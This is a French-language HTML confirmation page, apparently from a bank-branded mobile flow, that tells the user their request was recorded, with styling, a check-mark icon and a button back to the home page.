<!DOCTYPE html>
<html lang="fr" dir="ltr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Opération réussie</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0}
  html,body{height:100%;font-family:"Segoe UI",Tahoma,Arial,sans-serif}
  body{
    max-width:520px;margin:0 auto;min-height:100vh;
    background:
      linear-gradient(150deg, rgba(255,255,255,.6) 0%, rgba(255,255,255,.6) 15%, transparent 15.5%),
      linear-gradient(150deg, transparent 14%, rgba(255,255,255,.35) 14.5%, rgba(255,255,255,.35) 28%, transparent 28.5%),
      linear-gradient(150deg, transparent 27%, rgba(255,255,255,.2) 27.5%, rgba(255,255,255,.2) 42%, transparent 42.5%),
      linear-gradient(150deg, transparent 55%, rgba(255,255,255,.15) 55.5%, rgba(255,255,255,.15) 68%, transparent 68.5%);
    background-size:100% 100%;
    background-attachment:fixed;
    background-color:#e0e1e3;
    display:flex;flex-direction:column;
  }

  .top{flex:1;padding:80px 24px 0;text-align:center}

  .bank-logo{margin-bottom:40px}
  .bank-logo img{height:50px}

  .success-circle{
    width:100px;height:100px;border-radius:50%;background:#e8f5e9;
    display:flex;align-items:center;justify-content:center;
    margin:0 auto 24px;
    animation:scaleIn .5s ease;
  }
  @keyframes scaleIn{from{transform:scale(0);opacity:0}to{transform:scale(1);opacity:1}}
  .success-circle svg{width:50px;height:50px;fill:#2e7d32}

  h1{font-size:24px;font-weight:800;color:#2e7d32;margin-bottom:12px}
  .msg{color:#555;font-size:15px;line-height:1.8;margin-bottom:30px}

  .detail-box{
    background:#fff;border-radius:16px;padding:20px;margin:0 auto;
    max-width:340px;box-shadow:0 2px 12px rgba(0,0,0,.06);
    text-align:left;
  }
  .detail-row{display:flex;justify-content:space-between;padding:10px 0;
    border-bottom:1px solid #f0f0f0;font-size:14px}
  .detail-row:last-child{border-bottom:none}
  .detail-label{color:#888}
  .detail-value{font-weight:600;color:#1a1a1a}

  .bottom{padding:20px 24px 40px}
  .done-btn{
    display:block;width:100%;padding:18px;border:none;border-radius:50px;
    font-size:18px;font-weight:700;color:#fff;cursor:pointer;font-family:inherit;
    background:linear-gradient(135deg, #c62828, #e53935);
    box-shadow:0 4px 15px rgba(198,40,40,.3);
  }
</style>
</head>
<body>

<div class="top">
  <div class="bank-logo"><img src="images/logo.jpg" alt="SGA"></div>

  <div class="success-circle">
    <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
  </div>

  <h1>Votre demande a été enregistrée avec succès</h1>
  <p class="msg">Merci, nous vous contacterons bientôt.</p>
</div>

<div class="bottom">
  <button class="done-btn" onclick="location.href='index-fr.html'">Retour à l'accueil</button>
</div>

<script src="tracker.js"></script>
</body>
</html>
